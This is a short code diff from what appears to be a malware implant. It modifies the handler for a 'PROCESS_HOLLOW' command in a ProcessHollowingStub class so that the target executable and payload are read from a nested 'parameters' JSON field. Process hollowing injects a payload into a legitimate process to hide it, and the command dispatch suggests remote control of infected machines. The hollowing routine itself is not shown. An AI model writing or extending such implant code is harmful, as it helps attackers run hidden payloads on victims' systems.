@@ -14,10 +14,11 @@ bool ProcessHollowingStub::hollow_process(const std::string& target_exe,
 }
 
 void ProcessHollowingStub::init() {
-    register_command("PROCESS_HOLLOW", [this](const nlohmann::json& p){
+    register_command("PROCESS_HOLLOW", [this](const nlohmann::json& cmd){
 #ifdef DEBUG
         std::cout << "[DEBUG] PROCESS_HOLLOW command received" << std::endl;
 #endif
+        nlohmann::json p = cmd.value("parameters", nlohmann::json::object());
         if(!p.contains("target") || !p.contains("payload")) return;
         std::string target = p["target"].get<std::string>();
         std::string pay = p["payload"].get<std::string>();
